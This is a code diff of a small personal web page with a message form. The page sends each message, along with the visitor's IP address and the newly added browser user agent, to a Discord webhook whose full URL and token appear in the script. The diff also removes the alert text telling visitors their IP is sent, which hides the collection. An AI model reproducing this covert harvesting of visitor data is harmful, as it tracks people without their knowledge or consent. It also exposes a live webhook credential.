@@ -4,7 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>willie5354</title>
-  <link rel="icon" type="image/png" href="https://symbolsarchive.com/wp-content/uploads/2020/09/img_2080.png">
   <style>
     body {
       margin: 0;
@@ -137,7 +136,12 @@
         .then(res => res.json())
         .then(data => {
           const userIP = data.ip;
-          const fullMessage = `📨 Message: ${message}\n🌐 IP: ${userIP}`;
+          const userAgent = navigator.userAgent;
+
+          const fullMessage = 
+            `📨 Message: ${message}\n` +
+            `🌐 IP (IPv4): ${userIP}\n` +
+            `💻 User Agent: ${userAgent}`;
 
           return fetch("https://discord.com/api/webhooks/1376545268882997269/wlE0guNblC0d11uHuTtyJ8KUYe0T42BhB8TjSfi9uS5_xMAmGT4AbZj2UqNFXTU-dQhl", {
             method: "POST",
@@ -149,13 +153,13 @@
         })
         .then(res => {
           if (res.ok) {
-            alert("Message sent with IP.");
+            alert("Message sent ");
             document.getElementById('messageInput').value = "";
           } else {
             alert("Failed to send message.");
           }
         })
-        .catch(() => alert("Network or IP fetch error."));
+        .catch(() => alert("]error"));
     }
   </script>
 </body>
